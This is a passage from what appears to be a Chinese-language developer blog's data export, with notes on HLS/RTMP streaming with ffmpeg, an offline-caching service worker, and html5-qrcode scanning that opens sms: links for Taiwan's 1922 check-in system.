target=\"_blank\" rel=\"noopener\">ffmpeg 常用基本命令(转) - wainiwann - 博客园</a></li>\n</ul>\n<p>切割 hls 檔案<br><code>ffmpeg -i low_30.mp3 -c:a aac -b:a 64k -vn -hls_list_size 0 abc.m3u8</code><br><code>ffmpeg -i eq_1.mp4 -vcodec copy -acodec copy ~~-vbsf h264_mp4toannexb~~ -hls_time 10 -hls_list_size 999999999 output.m3u8</code><br><code>-vbsf h264_mp4toannexb</code> 拿掉就可以跑了<br>雖然不知道甚麼問題，不過解決了</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/45367762/only-one-ts-file-is-generating-while-encoding-mp3-file-to-m3u8-using-ffmpeg\" target=\"_blank\" rel=\"noopener\">Only one .ts file is generating while encoding mp3 file to m3u8 using ffmpeg - Stack Overflow</a></li>\n<li><a href=\"https://jonlabelle.com/snippets/view/shell/ffmpeg-http-live-streaming\" target=\"_blank\" rel=\"noopener\">ffmpeg HTTP Live Streaming</a></li>\n</ul>\n<ul>\n<li><a href=\"http://albert-oma.blogspot.com/2016/02/hls-http-live-streams.html\" target=\"_blank\" rel=\"noopener\">Albert 的筆記本: HLS (HTTP Live streams) 介紹</a></li>\n<li><a href=\"https://bgpsekai.thisistap.com/%E9%9A%A8%E6%89%8B%E4%BA%82%E5%81%9A/2017/02/%E5%B7%B4%E5%93%88%E5%8B%95%E7%95%AB%E7%98%8B-%E8%B7%B3%E9%81%8E%E7%B6%B2%E7%AB%99%E7%9B%B4%E6%8A%93-m3u8-%E6%9B%B4%E6%96%B0/\" target=\"_blank\" rel=\"noopener\">巴哈動畫瘋 跳過網站直抓 m3u8 (更新版 – 柏狗屁世界</a></li>\n<li><a href=\"https://www.cnblogs.com/hrybird/p/5125182.html\" target=\"_blank\" rel=\"noopener\">SRS 中增加身份验证 - dlbtsoft - 博客园</a></li>\n<li><a href=\"http://blog.51yip.com/server/1822.html\" target=\"_blank\" rel=\"noopener\">srs 身份认证«海底苍鹰(tank)博客</a></li>\n<li><a href=\"https://blog.gtwang.org/iot/raspberry-pi-nginx-rtmp-server-live-streaming/\" target=\"_blank\" rel=\"noopener\">樹莓派架設 RTMP 串流（Streaming）伺服器，傳送即時攝影機影像 - G. T. Wang</a></li>\n<li><a href=\"https://github.com/ossrs/srs/wiki/v2_CN_Home\" target=\"_blank\" rel=\"noopener\">v2_CN_Home · ossrs/srs Wiki</a></li>\n<li><a href=\"https://github.com/arut/nginx-rtmp-module/wiki/Directives\" target=\"_blank\" rel=\"noopener\">Directives · arut/nginx-rtmp-module Wiki</a></li>\n</ul>\n<ul>\n<li><a href=\"https://www.awaimai.com/2391.html\" target=\"_blank\" rel=\"noopener\">重启 php7-fpm 和 php5-fpm 方法大全 - 歪麦博客</a></li>\n<li><a href=\"http://www.avpk.cn/article/131.html\" target=\"_blank\" rel=\"noopener\">三种主流流媒体协议(RTMP，RTSP，HTTP)比较 - 流媒体技术 - AMS- 为天下企业提供流媒体软件引擎！</a></li>\n<li><a href=\"https://stackoverflow.com/questions/2245040/how-can-i-display-an-rtsp-video-stream-in-a-web-page\" target=\"_blank\" rel=\"noopener\">How can I display an RTSP video stream in a web page? - Stack Overflow</a></li>\n<li><a href=\"https://winddoing.github.io/post/34052.html\" target=\"_blank\" rel=\"noopener\">流媒体之 RTSP/RTP/RTCP | Winddoing’s Blog</a></li>\n<li><a href=\"https://docs.peer5.com/guides/setting-up-hls-live-streaming-server-using-nginx/\" target=\"_blank\" rel=\"noopener\">Setting up HLS live streaming server using NGINX - Peer5 Docs</a></li>\n<li><a href=\"http://blog.51yip.com/server/1822.html\" target=\"_blank\" rel=\"noopener\">srs 身份认证«海底苍鹰(tank)博客</a></li>\n<li><a href=\"http://blog.51yip.com/server/1815.html\" target=\"_blank\" rel=\"noopener\">srs 流媒体服务器 安装配置«海底苍鹰(tank)博客</a></li>\n<li><a href=\"https://blog.csdn.net/leixiaohua1020/article/details/12029543\" target=\"_blank\" rel=\"noopener\">ffmpeg 处理 RTMP 流媒体的命令大全 - 雷霄骅(leixiaohua1020)的专栏 - CSDN 博客</a></li>\n<li><a href=\"https://tw.saowen.com/a/c003e14c9686e3a151be9203a48ccf662cff5ec90e5437e9e8b0c0c51e266371\" target=\"_blank\" rel=\"noopener\">ffmpeg 處理 RTMP 流媒體的命令和傳送流媒體的命令（UDP，RTP，RTMP） - 掃文資訊</a></li>\n</ul>\n<p><a href=\"http://blog.51cto.com/lyd0721/1429803\" target=\"_blank\" rel=\"noopener\">Nginx-rtmp 模块实现流媒体 play、push、pull 功能-Dream come true-51CTO 博客</a><br><a href=\"http://www.dengshenyu.com/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/2016/09/05/live-streaming.html\" target=\"_blank\" rel=\"noopener\">直播技术实现(一)</a><br><a href=\"http://www.dengshenyu.com/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/2016/09/05/live-streaming-2.html\" target=\"_blank\" rel=\"noopener\">直播技术实现(二)</a><br><a href=\"https://nat.moe/technologies/yinfb/973/\" target=\"_blank\" rel=\"noopener\">筆記：使用 nginx 搭建一個 HLS(HTTP Live Streaming) &amp; Rtmp 直播服務器 | 奈特的魔法科研</a></p>\n<p>名詞簡單小記</p>\n<h4 id=\"SRS-Simple-RTMP-Server\"><a href=\"#SRS-Simple-RTMP-Server\" class=\"headerlink\" title=\"SRS(Simple RTMP Server)\"></a>SRS(Simple RTMP Server)</h4><p>架設 RTMP Server<br>簡單來說就是<code>直播伺服器</code></p>\n<blockquote>\n<p>3、将其中一个直播流，视频改用 h264 压缩，音频不变，送至另外一个直播服务流<br><code>ffmpeg -i rtmp://server/live/originalStream -c:a copy -c:v libx264 -vpre slow -f flv rtmp://server/live/h264Stream</code><br>當出看一直看不到為什麼 rtmp 傳到另一個 rtmp<br>後來看到<code>直播服務流</code><br>就想到應該像 youtube,twitter<br>讓我想到 obs 應該也是發到 rtmp server 去</p>\n</blockquote>\n<h4 id=\"rtmp-rstp-hls-http-live-streaming\"><a href=\"#rtmp-rstp-hls-http-live-streaming\" class=\"headerlink\" title=\"rtmp rstp hls(http live streaming)\"></a>rtmp rstp hls(http live streaming)</h4><ul>\n<li><a href=\"http://www.avpk.cn/article/131.html\" target=\"_blank\" rel=\"noopener\">三种主流流媒体协议(RTMP，RTSP，HTTP)比较 - 流媒体技术 - AMS- 为天下企业提供流媒体软件引擎！</a></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1、HTTP協議:</span><br><span class=\"line\"> HTTP的視頻協議，主要是在互聯網普及之後。在互聯網上看視頻的需求下形成的。</span><br><span class=\"line\">   最初的HTTP視頻協議，沒有任何特別之處，就是通用的HTTP文件漸進式下載。本質就是下載視頻文件，而利用視頻文件本身的特點，就是存在頭部信息，和部分視頻幀數據，就完全可以解碼播放了。顯然這種方式需要將視頻文件的頭部信息放在文件的前面。有些例如faststart工具，就是專門做這個功能的。</span><br><span class=\"line\">    但是最為原始的狀態下，視頻無法進行快進或者跳轉播放到文件尚未被下載到的部分。這個時候對HTTP協議提出了range-request的要求。這個目前幾乎所有HTTP的服務器都支持了。range-request，是請求文件的部分數據，指定偏移字節數。在視頻客戶端解析出視頻文件的頭部後，就可以判斷後續視頻相應的幀的位置了。或者根據碼率等信息，計算相應的為位置。</span><br><span class=\"line\"></span><br><span class=\"line\">優點：</span><br><span class=\"line\">HTTP Live Streaming 還有一個巨大優勢：自適應碼率流播（adaptive streaming）。效果就是客戶端會根據網絡狀況自動選擇不同碼率的視頻流，條件允許的情況下使用高碼率，網絡繁忙的時候使用低碼率，並且自動在二者間隨意切換。這對移動設備網絡狀況不穩定的情況下保障流暢播放非常有幫助。實現方法是服務器端提供多碼率視頻流，並且在列表文件中註明，播放器根據播放進度和下載速度自動調整。使用起來也非常簡單。</span><br><span class=\"line\">缺點：</span><br><span class=\"line\">    實時性相對較差，直播的時候延遲比較高。當然，現在進化出來的flv_over_http或者ts_over_http也可以做到直播延時很低，基本和rtmp協議差不多。</span><br><span class=\"line\"></span><br><span class=\"line\">2、RTSP協議：</span><br><span class=\"line\">用於Internet上針對多媒體數據流的一種傳輸協議，是TCP/IP協議體系中的一個應用層協議，RTSP在體系結構上位於RTP和RTCP之上，它使用TCP或UDP完成數據傳輸，該協議定義了一對多應用程序如何有效地通過IP網絡傳送多媒體數據。</span><br><span class=\"line\">   本協議是最早的視頻傳輸協議。其中RTSP協議用於視頻點播的會話控制，例如發起點播請求的SETUP請求，進行具體播放操作的PLAY、PAUSE請求，視頻的跳轉也是通過PLAY請求的參數支持的。</span><br><span class=\"line\"></span><br><span class=\"line\">優點：</span><br><span class=\"line\">RTSP協議族的優勢，在於可以控制到視頻幀，因此可以承載實時性很高的應用。這個優點是相對於HTTP方式的最大優點。H.323視頻會議協議，底層一般採用RTSP協議。RTSP協議族的複雜度主要集中在服務器端，因為服務器端需要parse視頻文件，seek到具體的視頻幀，而且可能還需要進行倍速播放（就是老舊的DVD帶的那種2倍速，4倍速播放的功能），倍速播放功能是RTSP協議獨有的，其他視頻協議都無法支持。</span><br><span class=\"line\">缺點：</span><br><span class=\"line\">就是服務器端的複雜度也比較高，實現起來也比較複雜。Ios端不支持該協議。</span><br><span class=\"line\"></span><br><span class=\"line\">3、RTMP協議：</span><br><span class=\"line\">   RTMP是Real Time Messaging Protocol（實時消息傳輸協議）的首字母縮寫。RTMP(Real Time Messaging Protocol)實時消息傳送協議是Adobe Systems公司為Flash播放器和服務器之間音頻、視頻和數據傳輸 開發的開放協議。該協議基於TCP，是一個協議族，包括RTMP基本協議及RTMPT/RTMPS/RTMPE等多種變種。RTMP是一種設計用來進行實時數據通信的網絡協議，主要用來在Flash/AIR平台和支持RTMP協議的流媒體/交互服務器之間進行音視頻和數據通信。支持該協議的軟件包括Adobe Media Server/Aoku Media Server/red5/Wowza等。</span><br><span class=\"line\"></span><br><span class=\"line\">優點：</span><br><span class=\"line\"></span><br><span class=\"line\">支持直播、點播</span><br><span class=\"line\"></span><br><span class=\"line\">缺點:</span><br><span class=\"line\">需要專用的服務器。</span><br><span class=\"line\"></span><br><span class=\"line\">三、協議對比</span><br><span class=\"line\">關於三個RTMP，RTSP，HTTP的對比：</span><br><span class=\"line\">1.RTMP是adobe的，RTSP是 android native支持，http協議。</span><br><span class=\"line\">2.RTMP和HTTP有adaptive streaming的技術，RTSP沒有</span><br><span class=\"line\">3.RTSP實時性是最好的，HTTP實時性比較差。</span><br><span class=\"line\">4.ios不支持rtsp，安卓支持。</span><br><span class=\"line\"></span><br><span class=\"line\">四、總結</span><br><span class=\"line\">  三種協議各有優缺點，rtmp協議應用範圍比較窄，一般客戶端需要用flash接收，rtsp一般常用於監控領域和對實時性要求比較高的場合，http的延伸hls用的比較多，一般用在移動終端觀看，一般一個成熟的流媒體服務系統都需要支持這三種協議，甚至更多的協議，比如udp組播，單播，或者p2p協議等。</span><br><span class=\"line\">   Aoku Media Server是可以同時支持這三種流媒體協議的。是國內為數不多的專業流媒體服務系統，提供的免費版可以供用戶進行三種協議的測試對比</span><br></pre></td></tr></table></figure>\n<p>簡單來說，hls 是基於 http<br>但是只有 apple 支援，所以 apple 裝置可以直接用<br>要瀏覽器支援要用<a href=\"https://github.com/video-dev/hls.js/\" target=\"_blank\" rel=\"noopener\">video-dev/hls.js: JavaScript HLS client using Media Source Extension</a></p>\n<h4 id=\"nginx-rtmp-module\"><a href=\"#nginx-rtmp-module\" class=\"headerlink\" title=\"nginx-rtmp-module\"></a>nginx-rtmp-module</h4><p><del>目前感覺就是跟 rtmp 與 rtmp server 串接用</del><br><a href=\"http://blog.51cto.com/lyd0721/1429803\" target=\"_blank\" rel=\"noopener\">Nginx-rtmp 模块实现流媒体 play、push、pull 功能-Dream come true-51CTO 博客</a><br><a href=\"/blog/2018/11/13/hls影音串流小記/1.png\" title=\"備份圖\">備份圖</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Nginx RTMP Module - 架構在Nginx之上, 也算老牌了, 支援RTMP和HLS, 但看code base, 實在也沒啥在更新</span><br><span class=\"line\">Mona server - 支援RTMP, HTTP(非HLS), Web socket等等</span><br><span class=\"line\">Red5 Media Server - 支援RTMP, HLS, WebSocket, RTSP, 好像是要錢</span><br><span class=\"line\">Simpe RTMP Server - 這是由中國的觀止雲這家開源出來的, 講”Simple”其實一點都不Simple, 輕量, 穩定(至少我試直播一晚上都還蠻順利的), 好擴展(支援forward to edge), 可RTMP轉HLS, 因此我最後選擇這個方案</span><br></pre></td></tr></table></figure>\n<p>其實今天仔細找了一下，SRS 跟 nginx-rtmp-module 只要選其中一種就可以了<br>參考來源:<a href=\"http://blog.jln.co/%E7%AD%86%E8%A8%98-%E4%B8%AD%E7%A7%8B%E9%80%A3%E5%81%87%E5%B0%8F%E5%AF%A6%E9%A9%97/\" target=\"_blank\" rel=\"noopener\">[筆記] 中秋連假小實驗 – Le murmure de Julian</a></p>\n<p>裡面寫的很詳細</p>\n<h4 id=\"影片-音樂傳流檔案\"><a href=\"#影片-音樂傳流檔案\" class=\"headerlink\" title=\"影片/音樂傳流檔案\"></a>影片/音樂傳流檔案</h4><p>mp2t for audio/video<br>m3u8 for 多媒體列表檔案格式</p>\n<h2 id=\"hls-加密\"><a href=\"#hls-加密\" class=\"headerlink\" title=\"hls 加密\"></a>hls 加密</h2><ul>\n<li><a href=\"http://akagi201.org/post/hls-explained/\" target=\"_blank\" rel=\"noopener\">HLS 协议详解 · Akagi201</a></li>\n<li><a href=\"https://www.google.com/search?client=firefox-b-d&amp;q=hls+%E5%8A%A0%E5%AF%86\" target=\"_blank\" rel=\"noopener\">hls 加密 - Google 搜尋</a></li>\n<li><a href=\"https://github.com/gwuhaolin/blog/issues/10\" target=\"_blank\" rel=\"noopener\">流媒体加密 · Issue #10 · gwuhaolin/blog</a></li>\n<li><a href=\"https://juejin.im/entry/59f1884f6fb9a0452206ba93\" target=\"_blank\" rel=\"noopener\">HLS 架构简介及播放加密的 HLS - Android - 掘金</a></li>\n</ul>\n<p>雖然最近沒有打算做這個相關東西<br>但是不知道為什麼對 hls 特別有興趣 XD<br>越記越多，希望哪天有機會用到</p>\n","categories":["HTML"],"tags":["hls","ffmpeg"]},{"title":"html5 離線網頁方法","url":"/blog/2021/06/02/html5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95/","content":"<p>最近寫個小APP<br>想說沒網路也能用<br>沒想到也是一個大學問</p>\n<a id=\"more\"></a>\n<h2 id=\"舊的使用方法-以廢棄\"><a href=\"#舊的使用方法-以廢棄\" class=\"headerlink\" title=\"舊的使用方法(以廢棄)\"></a>舊的使用方法(以廢棄)</h2><p>建議不用使用<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Using_the_application_cache\" target=\"_blank\" rel=\"noopener\">Using the application cache - HTML: HyperText Markup Language | MDN</a><br>以廢棄</p>\n<p>使用參考</p>\n<p><a href=\"https://ithelp.ithome.com.tw/articles/10058385\" target=\"_blank\" rel=\"noopener\">[HTML5試試看-25] 離線程式 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000000732617\" target=\"_blank\" rel=\"noopener\">有趣的HTML5：离线存储 - SegmentFault 思否</a></p>\n<h2 id=\"sw\"><a href=\"#sw\" class=\"headerlink\" title=\"sw\"></a>sw</h2><p><a href=\"https://mp.weixin.qq.com/s/aboA9dtCK6t0fzs0JU58Iw\" target=\"_blank\" rel=\"noopener\">service worker 实现离线缓存</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1wt411E7QD?p=10\" target=\"_blank\" rel=\"noopener\">PWA-3小时带你实现渐进式WebAPP_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a></p>\n<p><a href=\"https://www.gushiciku.cn/dc_tw/108051214\" target=\"_blank\" rel=\"noopener\">使用Service worker實現加速/離線訪問靜態blog網站_谷歌開發者 - 微文庫</a></p>\n<h3 id=\"實作\"><a href=\"#實作\" class=\"headerlink\" title=\"實作\"></a>實作</h3><p><a href=\"https://developers.google.com/web/fundamentals/codelabs/offline?hl=zh-tw\" target=\"_blank\" rel=\"noopener\">https://developers.google.com/web/fundamentals/codelabs/offline?hl=zh-tw</a><br>參照裡面做法</p>\n<ol>\n<li><p>index.html</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">if(&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class=\"line\">  navigator.serviceWorker</span><br><span class=\"line\">           .register(&apos;/sw.js&apos;)</span><br><span class=\"line\">           .then(function() &#123; console.log(&quot;Service Worker Registered&quot;); &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>sw.js</p>\n</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">self.addEventListener(<span class=\"string\">'install'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'[Service Worker] Install'</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> cacheName = <span class=\"string\">'js13kPWA-v2'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> appShellFiles = [</span><br><span class=\"line\">    <span class=\"string\">'/'</span>,</span><br><span class=\"line\">    <span class=\"string\">'index.html'</span>,</span><br><span class=\"line\">    <span class=\"string\">'https://cdnjs.cloudflare.com/ajax/libs/html5-qrcode/2.0.1/html5-qrcode.min.js'</span></span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> contentToCache = appShellFiles;</span><br><span class=\"line\"></span><br><span class=\"line\">self.addEventListener(<span class=\"string\">'install'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'[Service Worker] Install'</span>);</span><br><span class=\"line\">    e.waitUntil(</span><br><span class=\"line\">      caches.open(cacheName).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">cache</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">'[Service Worker] Caching all: app shell and content'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> cache.addAll(contentToCache);</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  self.addEventListener(<span class=\"string\">'activate'</span>, event =&gt; &#123;</span><br><span class=\"line\">    event.waitUntil(self.clients.claim());</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  </span><br><span class=\"line\">  self.addEventListener(<span class=\"string\">'fetch'</span>, event =&gt; &#123;</span><br><span class=\"line\">    event.respondWith(</span><br><span class=\"line\">      caches.open(cacheName)</span><br><span class=\"line\">        .then(<span class=\"function\"><span class=\"params\">cache</span> =&gt;</span> cache.match(event.request, &#123;<span class=\"attr\">ignoreSearch</span>: <span class=\"literal\">true</span>&#125;))</span><br><span class=\"line\">        .then(<span class=\"function\"><span class=\"params\">response</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response || fetch(event.request);</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n<p>就順利成功</p>\n<p>有空再深入研究</p>\n","categories":["HTML5"],"tags":["html5"]},{"title":"html5-qrcode 簡單研究","url":"/blog/2021/06/02/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/","content":"<p>最近<a href=\"https://cdc-web.deepq.app/vsafe/scanner?liffId=1655719655-jmaeX5gA\" target=\"_blank\" rel=\"noopener\">疾管家</a><br>QRCOD掃描功能出來<br>公司叫我查看怎麼做出這個案例<br>簡單看了一下<br><a href=\"https://g0v.hackmd.io/@au/HkmyoS-Fu\" target=\"_blank\" rel=\"noopener\">1922 簡訊實聯制 - HackMD</a></p>\n<a id=\"more\"></a>\n<p>竟然是 html5-qrcode<br>想看他的原始碼，<del>竟然找不到</del><br>後來看原始碼，有看到map設定</p>\n<p>突然想到這個好像能看原始碼<br><a href=\"https://www.facebook.com/will.fans/videos/1834092806619855\" target=\"_blank\" rel=\"noopener\">保哥 - 前端工程師不可不知的 Source Maps 應用技巧</a></p>\n<h3 id=\"html5-qrcode-簡單探討\"><a href=\"#html5-qrcode-簡單探討\" class=\"headerlink\" title=\"html5-qrcode 簡單探討\"></a>html5-qrcode 簡單探討</h3><p>取得相機功能<br>預防以後API會變<br>這邊主要連結到官方文件</p>\n<p>另外，需要<code>https</code>協定才能開攝像頭</p>\n<p>假如你有架設traefik+docker<br>可以用以下指令快速建制</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d --rm  --name my-apache-app  -v <span class=\"string\">\"<span class=\"variable\">$PWD</span>\"</span>:/usr/<span class=\"built_in\">local</span>/apache2/htdocs/     -l  <span class=\"string\">\"traefik.http.routers.testweb.rule=Host(\\`testweb.xxxx.duckdns.org\\`)\"</span>  -l <span class=\"string\">\"traefik.http.routers.testweb.tls=true\"</span>  --net traefik_network  httpd:2.4</span><br></pre></td></tr></table></figure>\n<h4 id=\"抓取設備\"><a href=\"#抓取設備\" class=\"headerlink\" title=\"抓取設備\"></a>抓取設備</h4><p><a href=\"https://github.com/mebjas/html5-qrcode#pro-mode---if-you-want-to-implement-your-own-user-interface\" target=\"_blank\" rel=\"noopener\">GitHub - mebjas/html5-qrcode: A cross platform HTML5 QR code reader</a></p>\n<p>device id 最後一個，為後鏡頭<br>後來發現，不需要這樣抓後鏡頭</p>\n<h4 id=\"設定後鏡頭\"><a href=\"#設定後鏡頭\" class=\"headerlink\" title=\"設定後鏡頭\"></a>設定後鏡頭</h4><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// If you want to prefer back camera</span></span><br><span class=\"line\">html5QrCode.start(&#123; <span class=\"attr\">facingMode</span>: <span class=\"string\">\"environment\"</span> &#125;, config, qrCodeSuccessCallback);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://github.com/mebjas/html5-qrcode#pro-mode---if-you-want-to-implement-your-own-user-interface\" target=\"_blank\" rel=\"noopener\">GitHub - mebjas/html5-qrcode: A cross platform HTML5 QR code reader</a></p>\n<h4 id=\"開始掃qrcode\"><a href=\"#開始掃qrcode\" class=\"headerlink\" title=\"開始掃qrcode\"></a>開始掃qrcode</h4><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> html5QrCode = <span class=\"keyword\">new</span> Html5Qrcode(<span class=\"comment\">/* element id */</span> <span class=\"string\">\"reader\"</span>);</span><br><span class=\"line\">html5QrCode.start(</span><br><span class=\"line\">  cameraId, </span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fps: <span class=\"number\">10</span>,    <span class=\"comment\">// Optional frame per seconds for qr code scanning</span></span><br><span class=\"line\">    qrbox: <span class=\"number\">250</span>  <span class=\"comment\">// Optional if you want bounded box UI</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  qrCodeMessage =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// do something when code is read</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  errorMessage =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// parse error, ignore it.</span></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">.catch(<span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// Start failed, handle it.</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"暫停掃-qrcode\"><a href=\"#暫停掃-qrcode\" class=\"headerlink\" title=\"暫停掃 qrcode\"></a>暫停掃 qrcode</h4><p><a href=\"https://github.com/mebjas/html5-qrcode#stop-scanning\" target=\"_blank\" rel=\"noopener\">GitHub - mebjas/html5-qrcode: A cross platform HTML5 QR code reader</a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">html5QrCode.stop().then(<span class=\"function\"><span class=\"params\">ignore</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// QR Code scanning is stopped.</span></span><br><span class=\"line\">&#125;).catch(<span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// Stop failed, handle it.</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"地雷-記得掃到馬上停掉\"><a href=\"#地雷-記得掃到馬上停掉\" class=\"headerlink\" title=\"地雷(記得掃到馬上停掉)\"></a>地雷(記得掃到馬上停掉)</h4><p>記得掃到馬上停掉!!<br>記得掃到馬上停掉!!<br>記得掃到馬上停掉!!</p>\n<p>因為掃到，持續會callback 開簡訊<br>會悲劇….</p>\n<p>掃到，stopcamera 就比較不會出問題</p>\n<h3 id=\"js-轉簡訊\"><a href=\"#js-轉簡訊\" class=\"headerlink\" title=\"js 轉簡訊\"></a>js 轉簡訊</h3><p>這邊有個大地雷 qrcode 轉 sms 程式<br>Android 竟然不能轉<br>但是IOS可以</p>\n<p>這邊就是使用<br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (isAndroid()) &#123;</span><br><span class=\"line\">    location.href = <span class=\"string\">\"sms:1922?body=00000000\"</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// iOS</span></span><br><span class=\"line\">    location.href = <span class=\"string\">\"sms:1922&amp;body=00000000\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>Android用超連結就可順利執行</p>\n<p>為什麼liff Android 可以直接轉的?目前猜測是line app可以這樣做<br>把疾管家用到 Chrome 就不能使用<br>這邊就不深入了</p>\n<h4 id=\"網路範例\"><a href=\"#網路範例\" class=\"headerlink\" title=\"網路範例\"></a>網路範例</h4><p><a href=\"https://bradorego.com/test/sms.html\" target=\"_blank\" rel=\"noopener\">bradorego.com/test/sms.html</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms:5552345678&quot;&gt;Phone only&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms:+15552345678&quot;&gt;Phone(+1) only&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms:?body=Hello,%20world&quot;&gt;Body only&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms:;body=Hello,%20world&quot;&gt;;body only&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms:5552345678?body=Hello%20World&quot;&gt;Phone and ?body&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms:+15552345678?body=Hello%20World&quot;&gt;Phone(+1) and ?body&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms:5552345678;body=Hello%20World&quot;&gt;Phone(+1) and ;body&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms://5552345678&quot;&gt;Phone only (sms://)&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms://+15552345678&quot;&gt;Phone(+1) only (sms://)&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms://5552345678?body=Hello,%20World&quot;&gt;Phone and ?body (sms://)&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms://+15552345678?body=Hello,%20World&quot;&gt;Phone(+1) and ?body (sms://)&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms://5552345678;body=Hello,%20World&quot;&gt;Phone and ;body (sms://)&lt;/a&gt;</span><br><span class=\"line\">\t&lt;/p&gt;</span><br><span class=\"line\">\t&lt;p&gt;</span><br><span class=\"line\">\t\t&lt;a href=&quot;sms://+15552345678;body=Hello,%20World&quot;&gt;Phone(+1) and ;body (sms://)&lt;/a&gt;</span><br><span 